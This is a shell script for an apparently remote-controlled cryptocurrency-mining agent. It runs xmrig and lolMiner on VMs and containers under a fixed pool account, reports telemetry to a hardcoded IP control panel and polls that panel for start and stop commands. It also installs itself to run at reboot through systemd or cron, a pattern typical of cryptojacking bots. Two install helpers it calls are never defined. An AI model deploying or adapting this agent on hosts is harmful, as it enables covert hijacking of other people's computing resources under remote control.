#!/bin/sh
set -u

####################################
# MINING CONTROL CENTER — AGENT
# UNIVERSAL CONTROL (VM + CONTAINER)
####################################

### ===== PANEL =====
PANEL="http://178.47.141.130:3333"
TOKEN="mamont22187"
INTERVAL=30

### ===== MINING =====
KRIPTEX_USERNAME="krxX3PVQVR"
HOST="$(hostname)"

ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"

BASE="/opt/mining"
LOG="/var/log/mining"
RUN="/var/run"

ETC_USER="${KRIPTEX_USERNAME}.${HOST}"
XMR_USER="${KRIPTEX_USERNAME}.${HOST}"

####################################
have() { command -v "$1" >/dev/null 2>&1; }

is_systemd() {
  [ -d /run/systemd/system ] && pidof systemd >/dev/null 2>&1
}

####################################
# -------- PANEL API --------------
####################################

send_event() {
  curl -s "$PANEL/api/event" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"level\": \"$1\",
      \"message\": \"$2\"
    }" >/dev/null 2>&1 || true
}

send_telemetry() {
  CPU_STATUS="stopped"
  GPU_STATUS="stopped"

  if is_systemd; then
    CPU_STATUS="$(systemctl is-active mining-cpu 2>/dev/null || echo stopped)"
    GPU_STATUS="$(systemctl is-active mining-gpu 2>/dev/null || echo stopped)"
  else
    [ -f "$RUN/mining-cpu.pid" ] && CPU_STATUS="running"
    [ -f "$RUN/mining-gpu.pid" ] && GPU_STATUS="running"
  fi

  GPU_OK=false
  lspci 2>/dev/null | grep -qiE "nvidia|amd" && GPU_OK=true

  HASHRATE=$(grep -i hashrate "$LOG/xmr.log" 2>/dev/null | tail -1 | grep -oE '[0-9]+' || echo 0)

  curl -s "$PANEL/api/telemetry" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"cpu_mining\": \"$CPU_STATUS\",
      \"gpu_mining\": \"$GPU_STATUS\",
      \"gpu_detected\": $GPU_OK,
      \"hashrate\": $HASHRATE
    }" >/dev/null 2>&1 || true
}

####################################
# -------- PROCESS CONTROL ---------
####################################

start_cpu() {
  stop_cpu
  if is_systemd; then
    systemctl start mining-cpu
  else
    nohup "$BASE/xmr/xmrig" -o "$XMR_POOL" -u "$XMR_USER" -p x >> "$LOG/xmr.log" 2>&1 &
    echo $! > "$RUN/mining-cpu.pid"
  fi
}

stop_cpu() {
  if is_systemd; then
    systemctl stop mining-cpu
  else
    [ -f "$RUN/mining-cpu.pid" ] && kill "$(cat "$RUN/mining-cpu.pid")" 2>/dev/null || true
    rm -f "$RUN/mining-cpu.pid"
  fi
}

start_gpu() {
  stop_gpu
  if is_systemd; then
    systemctl start mining-gpu
  else
    nohup "$BASE/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL" --user "$ETC_USER" >> "$LOG/etc.log" 2>&1 &
    echo $! > "$RUN/mining-gpu.pid"
  fi
}

stop_gpu() {
  if is_systemd; then
    systemctl stop mining-gpu
  else
    [ -f "$RUN/mining-gpu.pid" ] && kill "$(cat "$RUN/mining-gpu.pid")" 2>/dev/null || true
    rm -f "$RUN/mining-gpu.pid"
  fi
}

####################################
# -------- CONTROL QUEUE ----------
####################################

ack() {
  curl -s "$PANEL/api/control/ack" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"command_id\": $1,
      \"result\": \"$2\",
      \"message\": \"$3\"
    }" >/dev/null 2>&1 || true
}

check_control() {
  RESP=$(curl -s "$PANEL/api/control/pending?hostname=$HOST" -H "token: $TOKEN")
  echo "$RESP" | grep -q '"action"' || return

  ID=$(echo "$RESP" | grep -oE '"id":[0-9]+' | grep -oE '[0-9]+')
  ACT=$(echo "$RESP" | grep -oE '"action":"[^"]+' | cut -d'"' -f4)

  case "$ACT" in
    start_cpu) start_cpu ;;
    stop_cpu) stop_cpu ;;
    start_gpu) start_gpu ;;
    stop_gpu) stop_gpu ;;
    restart_all)
      stop_cpu; stop_gpu
      start_cpu; start_gpu
    ;;
    *)
      ack "$ID" "failed" "unknown action"
      return
    ;;
  esac

  ack "$ID" "success" "$ACT executed"
}

####################################
# -------- AUTOSTART --------------
####################################

ensure_autostart() {
  if is_systemd; then
    systemctl enable mining-agent >/dev/null 2>&1 || true
  else
    crontab -l 2>/dev/null | grep -q "min.sh agent" || \
      (crontab -l 2>/dev/null; echo "@reboot $BASE/min.sh agent") | crontab -
  fi
}

####################################
# -------- AGENT ------------------
####################################

agent() {
  send_event "INFO" "Agent started (systemd=$(is_systemd && echo yes || echo no))"
  ensure_autostart

  start_cpu
  start_gpu

  while true; do
    send_telemetry
    check_control
    sleep "$INTERVAL"
  done
}

####################################
# -------- INSTALL ----------------
####################################

install() {
  mkdir -p "$BASE" "$LOG" "$RUN"
  install_deps 2>/dev/null || true
  install_miners 2>/dev/null || true
  agent
}

####################################
# -------- MAIN -------------------
####################################

case "${1:-install}" in
  install) install ;;
  agent) agent ;;
  start_cpu) start_cpu ;;
  stop_cpu) stop_cpu ;;
  start_gpu) start_gpu ;;
  stop_gpu) stop_gpu ;;
esac
